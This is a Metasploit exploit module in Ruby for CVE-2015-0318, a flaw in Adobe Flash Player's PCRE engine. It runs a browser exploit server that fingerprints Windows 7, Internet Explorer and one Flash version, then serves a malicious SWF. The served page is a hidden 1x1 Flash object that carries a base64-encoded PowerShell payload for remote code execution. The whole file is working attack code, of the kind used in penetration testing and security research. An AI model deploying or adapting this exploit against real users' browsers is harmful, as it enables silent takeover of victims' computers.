# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  CLASSID =  &#039;d27cdb6e-ae6d-11cf-96b8-444553540000&#039;

  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Adobe Flash Player PCRE Regex Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in Adobe Flash Player. A compilation logic error
        in the PCRE engine, specifically in the handling of the \c escape sequence when followed by
        a multi-byte UTF8 character, allows arbitrary execution of PCRE bytecode.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Mark Brand&#039;, # Found vuln
          &#039;sinn3r&#039;      # MSF
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2015-0318&#039; ],
          [ &#039;URL&#039;, &#039;http://googleprojectzero.blogspot.com/2015/02/exploitingscve-2015-0318sinsflash.html&#039; ],
          [ &#039;URL&#039;, &#039;https://code.google.com/p/google-security-research/issues/detail?id=199&#039; ]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039; => 1024,
          &#039;DisableNops&#039; => true
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;Retries&#039; => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;BrowserRequirements&#039; =>
        {
          :source  => /script|headers/i,
          :clsid   => "{#{CLASSID}}",
          :method  => "LoadMovie",
          :os_name => OperatingSystems::Match::WINDOWS_7,
          :ua_name => Msf::HttpClients::IE,
          # So we&#039;re gonna limit to this one for now. More validation needed in the future.
          :flash   => lambda { |ver| ver == &#039;16.0.0.235&#039; }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, {} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Nov 25 2014",
      &#039;DefaultTarget&#039;  => 0))
  end

  def exploit
    # Please see data/exploits/CVE-2015-0318/ for source,
    # that&#039;s where the actual exploit is
    @swf = create_swf
    super
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status("Sending SWF...")
      send_response(cli, @swf, {&#039;Content-Type&#039;=>&#039;application/x-shockwave-flash&#039;, &#039;Pragma&#039; => &#039;no-cache&#039;})
      return
    end

    print_status("Sending HTML...")
    tag = retrieve_tag(cli, request)
    profile = get_profile(tag)
    profile[:tried] = false unless profile.nil? # to allow request the swf
    send_exploit_html(cli, exploit_template(cli, target_info), {&#039;Pragma&#039; => &#039;no-cache&#039;})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    target_payload = get_payload(cli, target_info)
    psh_payload = cmd_psh_payload(target_payload, &#039;x86&#039;, {remove_comspec: true})
    b64_payload = Rex::Text.encode_base64(psh_payload)

    html_template = %Q|<html>
    <body>
    <object classid="clsid:#{CLASSID}" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=b64_payload%>" />
    <param name="Play" value="true" />
    <embed type="application/x-shockwave-flash" width="1" height="1" src="<%=swf_random%>" allowScriptAccess="always" FlashVars="sh=<%=b64_payload%>" Play="true"/>
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2015-0318", "Main.swf" )
    swf = ::File.open(path, &#039;rb&#039;) { |f| swf = f.read }

    swf
  end

end

